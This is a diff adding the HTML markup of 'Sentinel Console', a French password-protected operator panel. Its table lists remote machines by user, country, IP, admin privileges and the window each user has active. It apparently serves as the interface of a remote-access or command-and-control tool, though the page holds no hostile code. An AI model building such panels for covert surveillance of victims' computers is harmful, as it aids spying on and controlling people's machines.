@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sentinel Console</title>
+<link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+<header>
+  <div class="brand">SENTINEL<span>.</span></div>
+  <div class="stats">
+    <div class="on">en ligne <b id="s-on">0</b></div>
+    <div>total <b id="s-all">0</b></div>
+    <div>file <b id="s-q">0</b></div>
+  </div>
+  <div class="spacer"></div>
+  <input type="text" id="filter" placeholder="filtrer : pays, pc, utilisateur, ip…" style="width:280px">
+  <button class="ghost" id="btn-refresh">Rafraîchir</button>
+  <button class="ghost" id="btn-logout">Sortir</button>
+</header>
+
+<main>
+  <div id="gridwrap">
+    <table>
+      <thead>
+        <tr>
+          <th data-sort="host">PC</th>
+          <th data-sort="username">Utilisateur</th>
+          <th data-sort="os">OS</th>
+          <th data-sort="country">Pays</th>
+          <th data-sort="ip">IP</th>
+          <th data-sort="admin">Privilèges</th>
+          <th data-sort="active_window">Fenêtre active</th>
+          <th data-sort="ping_ms">Ping</th>
+          <th data-sort="idle">Vu</th>
+          <th data-sort="tag">Tag</th>
+        </tr>
+      </thead>
+      <tbody id="rows"></tbody>
+    </table>
+  </div>
+</main>
+
+<div id="menu"></div>
+
+<div id="login">
+  <div class="card">
+    <h1>SENTINEL</h1>
+    <p>Console opérateur</p>
+    <input type="password" id="pass" placeholder="mot de passe" autocomplete="current-password">
+    <button id="btn-login">Entrer</button>
+    <div class="err" id="login-err"></div>
+  </div>
+</div>
+
+<script src="/panel.js"></script>
+</body>
+</html>
